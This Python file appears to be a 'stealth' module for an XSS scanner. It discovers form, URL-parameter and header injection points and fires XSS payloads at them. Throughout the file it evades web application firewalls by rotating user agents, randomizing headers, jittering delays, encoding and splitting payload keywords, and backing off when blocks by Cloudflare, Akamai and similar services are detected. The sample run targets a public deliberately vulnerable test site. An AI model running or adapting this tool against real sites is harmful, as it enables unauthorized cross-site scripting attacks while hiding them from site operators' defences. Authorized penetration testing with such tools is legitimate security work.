"""
Stealth Scanner Mode for XSSProbe
Implements advanced evasion techniques to avoid detection
"""

import time
import random
import requests
from typing import Dict, List, Optional, Any
from urllib.parse import urljoin, urlparse
import threading
from queue import Queue


class StealthScanner:
    """
    Advanced stealth scanning with rate limiting, randomization, and evasion
    """
    
    def __init__(self, session: requests.Session, config: Dict[str, Any] = None):
        self.session = session
        self.config = config or self._get_default_config()
        self.request_queue = Queue()
        self.results = []
        self.lock = threading.Lock()
        
        # User agents for rotation
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/119.0",
            "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/118.0.2088.76"
        ]
    
    def _get_default_config(self) -> Dict[str, Any]:
        """Default stealth configuration"""
        return {
            "min_delay": 1.0,          # Minimum delay between requests (seconds)
            "max_delay": 3.0,          # Maximum delay between requests (seconds)
            "jitter_factor": 0.3,      # Random jitter factor
            "rotate_user_agent": True,  # Rotate User-Agent headers
            "randomize_headers": True,  # Add random headers
            "max_concurrent": 2,        # Maximum concurrent requests
            "request_timeout": 15,      # Request timeout (seconds)
            "retry_attempts": 2,        # Number of retry attempts
            "avoid_patterns": [         # Patterns that might trigger WAF
                "script", "alert", "javascript", "onload", "onerror"
            ],
            "encoding_methods": [       # Encoding methods to try
                "url", "html", "unicode", "hex"
            ]
        }
    
    def scan_target(self, target_url: str, payloads: List[str], 
                   scan_mode: str = "thorough") -> List[Dict]:
        """
        Main stealth scanning method
        
        Args:
            target_url: Target URL to scan
            payloads: List of XSS payloads to test
            scan_mode: Scanning mode (quick, normal, thorough)
        
        Returns:
            List of vulnerability findings
        """
        print(f"[STEALTH] Starting stealth scan of {target_url}")
        
        # Adjust configuration based on scan mode
        self._adjust_config_for_mode(scan_mode)
        
        # Discover injection points
        injection_points = self._discover_injection_points(target_url)
        print(f"[STEALTH] Found {len(injection_points)} injection points")
        
        # Test each injection point with stealth techniques
        for point in injection_points:
            self._test_injection_point_stealthily(point, payloads)
        
        return self.results
    
    def _adjust_config_for_mode(self, mode: str):
        """Adjust configuration based on scanning mode"""
        if mode == "quick":
            self.config["min_delay"] = 0.5
            self.config["max_delay"] = 1.5
            self.config["max_concurrent"] = 3
        elif mode == "normal":
            self.config["min_delay"] = 1.0
            self.config["max_delay"] = 2.5
            self.config["max_concurrent"] = 2
        elif mode == "thorough":
            self.config["min_delay"] = 2.0
            self.config["max_delay"] = 5.0
            self.config["max_concurrent"] = 1
        elif mode == "ultra_stealth":
            self.config["min_delay"] = 5.0
            self.config["max_delay"] = 15.0
            self.config["max_concurrent"] = 1
            self.config["jitter_factor"] = 0.5
    
    def _discover_injection_points(self, target_url: str) -> List[Dict]:
        """Discover potential injection points"""
        injection_points = []
        
        try:
            # Get the main page
            response = self._make_stealth_request(target_url)
            if not response:
                return injection_points
            
            # Parse forms
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Form-based injection points
            for form in soup.find_all('form'):
                action = form.get('action', target_url)
                method = form.get('method', 'GET').upper()
                
                # Get form inputs
                inputs = {}
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    name = input_tag.get('name')
                    if name and input_tag.get('type') != 'submit':
                        inputs[name] = input_tag.get('value', 'test')
                
                if inputs:
                    injection_points.append({
                        'type': 'form',
                        'url': urljoin(target_url, action),
                        'method': method,
                        'parameters': inputs
                    })
            
            # URL parameter injection points
            parsed_url = urlparse(target_url)
            if parsed_url.query:
                from urllib.parse import parse_qs
                params = parse_qs(parsed_url.query)
                url_params = {k: v[0] if v else '' for k, v in params.items()}
                
                injection_points.append({
                    'type': 'url_params',
                    'url': f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}",
                    'method': 'GET',
                    'parameters': url_params
                })
            
            # Header injection points (for advanced testing)
            injection_points.append({
                'type': 'headers',
                'url': target_url,
                'method': 'GET',
                'parameters': {
                    'User-Agent': 'test',
                    'Referer': 'test',
                    'X-Forwarded-For': 'test'
                }
            })
            
        except Exception as e:
            print(f"[STEALTH] Error discovering injection points: {e}")
        
        return injection_points
    
    def _test_injection_point_stealthily(self, injection_point: Dict, payloads: List[str]):
        """Test an injection point using stealth techniques"""
        print(f"[STEALTH] Testing {injection_point['type']} at {injection_point['url']}")
        
        for param_name in injection_point['parameters']:
            for payload in payloads:
                # Apply stealth transformations to payload
                stealth_payloads = self._generate_stealth_payloads(payload)
                
                for stealth_payload in stealth_payloads:
                    # Wait with randomized delay
                    self._stealth_delay()
                    
                    # Test the payload
                    vulnerability = self._test_single_payload(
                        injection_point, param_name, stealth_payload
                    )
                    
                    if vulnerability:
                        with self.lock:
                            self.results.append(vulnerability)
                        print(f"[STEALTH] 🚨 Vulnerability found: {vulnerability['url']}")
    
    def _generate_stealth_payloads(self, base_payload: str) -> List[str]:
        """Generate stealth variants of a payload"""
        variants = [base_payload]
        
        # URL encoding variants
        variants.append(self._url_encode(base_payload))
        variants.append(self._double_url_encode(base_payload))
        
        # HTML encoding variants
        variants.append(self._html_encode_random(base_payload))
        
        # Unicode encoding variants
        variants.append(self._unicode_encode(base_payload))
        
        # Case variation
        variants.append(self._random_case(base_payload))
        
        # Comment insertion (for JavaScript payloads)
        if 'script' in base_payload.lower():
            variants.append(self._insert_comments(base_payload))
        
        # Character substitution
        variants.append(self._character_substitution(base_payload))
        
        return list(set(variants))  # Remove duplicates
    
    def _url_encode(self, payload: str) -> str:
        """URL encode payload"""
        from urllib.parse import quote
        return quote(payload)
    
    def _double_url_encode(self, payload: str) -> str:
        """Double URL encode payload"""
        from urllib.parse import quote
        return quote(quote(payload))
    
    def _html_encode_random(self, payload: str) -> str:
        """Randomly HTML encode some characters"""
        result = ""
        for char in payload:
            if random.random() < 0.3:  # 30% chance to encode
                result += f"&#{ord(char)};"
            else:
                result += char
        return result
    
    def _unicode_encode(self, payload: str) -> str:
        """Unicode encode payload"""
        return ''.join(f'\\u{ord(c):04x}' if ord(c) > 127 else c for c in payload)
    
    def _random_case(self, payload: str) -> str:
        """Randomize case of alphabetic characters"""
        result = ""
        for char in payload:
            if char.isalpha():
                result += char.upper() if random.random() < 0.5 else char.lower()
            else:
                result += char
        return result
    
    def _insert_comments(self, payload: str) -> str:
        """Insert comments to break up keywords"""
        # Insert HTML comments
        payload = payload.replace('<script>', '<script>/*comment*/')
        payload = payload.replace('alert', 'ale/**/rt')
        return payload
    
    def _character_substitution(self, payload: str) -> str:
        """Substitute characters with alternatives"""
        substitutions = {
            'script': 'scr\\x69pt',
            'alert': 'window[\'ale\'+\'rt\']',
            '=': '\\x3d',
            '"': '\\x22',
            "'": '\\x27'
        }
        
        result = payload
        for original, substitute in substitutions.items():
            if original in result.lower():
                result = result.replace(original, substitute)
        
        return result
    
    def _stealth_delay(self):
        """Implement intelligent delay with jitter"""
        base_delay = random.uniform(
            self.config["min_delay"], 
            self.config["max_delay"]
        )
        
        # Add jitter
        jitter = base_delay * self.config["jitter_factor"] * random.uniform(-1, 1)
        total_delay = max(0.1, base_delay + jitter)
        
        time.sleep(total_delay)
    
    def _make_stealth_request(self, url: str, method: str = 'GET', 
                            data: Dict = None, headers: Dict = None) -> Optional[requests.Response]:
        """Make a request with stealth techniques applied"""
        try:
            # Prepare headers
            request_headers = self._prepare_stealth_headers(headers)
            
            # Make request with timeout and retries
            for attempt in range(self.config["retry_attempts"] + 1):
                try:
                    if method.upper() == 'POST':
                        response = self.session.post(
                            url, 
                            data=data, 
                            headers=request_headers,
                            timeout=self.config["request_timeout"],
                            allow_redirects=True
                        )
                    else:
                        response = self.session.get(
                            url, 
                            params=data, 
                            headers=request_headers,
                            timeout=self.config["request_timeout"],
                            allow_redirects=True
                        )
                    
                    # Check for WAF detection indicators
                    if self._detect_waf_block(response):
                        print(f"[STEALTH] ⚠️ Possible WAF detection, increasing stealth")
                        self._increase_stealth_level()
                        continue
                    
                    return response
                    
                except requests.RequestException as e:
                    if attempt < self.config["retry_attempts"]:
                        print(f"[STEALTH] Request failed, retrying... ({attempt + 1})")
                        time.sleep(random.uniform(1, 3))
                        continue
                    else:
                        print(f"[STEALTH] Request failed after retries: {e}")
                        break
                        
        except Exception as e:
            print(f"[STEALTH] Error making stealth request: {e}")
        
        return None
    
    def _prepare_stealth_headers(self, additional_headers: Dict = None) -> Dict[str, str]:
        """Prepare headers with stealth techniques"""
        headers = {}
        
        # Rotate User-Agent
        if self.config["rotate_user_agent"]:
            headers["User-Agent"] = random.choice(self.user_agents)
        
        # Add randomized headers
        if self.config["randomize_headers"]:
            optional_headers = {
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": random.choice([
                    "en-US,en;q=0.9",
                    "en-GB,en;q=0.9",
                    "en-US,en;q=0.8",
                    "en;q=0.9"
                ]),
                "Accept-Encoding": "gzip, deflate",
                "DNT": "1",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
            }
            
            # Randomly include some headers
            for header, value in optional_headers.items():
                if random.random() < 0.7:  # 70% chance to include
                    headers[header] = value
        
        # Add custom headers
        if additional_headers:
            headers.update(additional_headers)
        
        return headers
    
    def _detect_waf_block(self, response: requests.Response) -> bool:
        """Detect if request was blocked by WAF"""
        if not response:
            return False
            
        # Check status codes that might indicate WAF blocking
        waf_status_codes = [403, 406, 429, 501, 503]
        if response.status_code in waf_status_codes:
            return True
        
        # Check response content for WAF signatures
        waf_signatures = [
            "access denied", "blocked", "forbidden", "security",
            "cloudflare", "akamai", "incapsula", "sucuri",
            "firewall", "protection", "threat"
        ]
        
        response_text = response.text.lower()
        for signature in waf_signatures:
            if signature in response_text:
                return True
        
        return False
    
    def _increase_stealth_level(self):
        """Increase stealth level when detection is suspected"""
        self.config["min_delay"] *= 1.5
        self.config["max_delay"] *= 1.5
        self.config["jitter_factor"] = min(0.8, self.config["jitter_factor"] * 1.2)
        print("[STEALTH] 🕵️ Stealth level increased")
    
    def _test_single_payload(self, injection_point: Dict, param_name: str, 
                           payload: str) -> Optional[Dict]:
        """Test a single payload against an injection point"""
        try:
            # Prepare parameters
            test_params = injection_point['parameters'].copy()
            test_params[param_name] = payload
            
            # Make request based on injection point type
            if injection_point['type'] == 'form':
                if injection_point['method'] == 'POST':
                    response = self._make_stealth_request(
                        injection_point['url'], 'POST', test_params
                    )
                else:
                    response = self._make_stealth_request(
                        injection_point['url'], 'GET', test_params
                    )
            elif injection_point['type'] == 'url_params':
                response = self._make_stealth_request(
                    injection_point['url'], 'GET', test_params
                )
            elif injection_point['type'] == 'headers':
                response = self._make_stealth_request(
                    injection_point['url'], 'GET', headers=test_params
                )
            else:
                return None
            
            if not response:
                return None
            
            # Check for XSS indicators in response
            if self._check_xss_indicators(response.text, payload):
                return {
                    'type': 'xss',
                    'severity': 'high',
                    'url': injection_point['url'],
                    'parameter': param_name,
                    'payload': payload,
                    'method': injection_point['method'],
                    'injection_type': injection_point['type'],
                    'response_snippet': response.text[:500],
                    'status_code': response.status_code
                }
            
        except Exception as e:
            print(f"[STEALTH] Error testing payload: {e}")
        
        return None
    
    def _check_xss_indicators(self, response_text: str, payload: str) -> bool:
        """Check if response contains XSS indicators"""
        # Simple check for payload reflection
        if payload in response_text:
            return True
        
        # Check for decoded versions of the payload
        import html
        from urllib.parse import unquote
        
        decoded_variants = [
            html.unescape(payload),
            unquote(payload),
            unquote(unquote(payload))
        ]
        
        for variant in decoded_variants:
            if variant in response_text:
                return True
        
        # Check for JavaScript execution indicators
        js_indicators = [
            'javascript:', 'alert(', 'confirm(', 'prompt(',
            'eval(', 'setTimeout(', 'setInterval('
        ]
        
        for indicator in js_indicators:
            if indicator.lower() in response_text.lower():
                return True
        
        return False
    
    def generate_stealth_report(self) -> Dict:
        """Generate a comprehensive stealth scan report"""
        return {
            'scan_type': 'stealth',
            'total_vulnerabilities': len(self.results),
            'vulnerabilities': self.results,
            'stealth_config': self.config,
            'evasion_techniques_used': [
                'Rate limiting with jitter',
                'User-Agent rotation',
                'Header randomization',
                'Payload encoding variations',
                'WAF detection and adaptation'
            ],
            'scan_timestamp': time.time()
        }


# Example usage
if __name__ == "__main__":
    import requests
    
    # Create session
    session = requests.Session()
    
    # Initialize stealth scanner
    scanner = StealthScanner(session)
    
    # Test payloads
    test_payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>"
    ]
    
    # Run stealth scan
    results = scanner.scan_target(
        "https://testphp.vulnweb.com", 
        test_payloads, 
        "thorough"
    )
    
    # Generate report
    report = scanner.generate_stealth_report()
    print(f"Stealth scan completed. Found {len(results)} vulnerabilities.")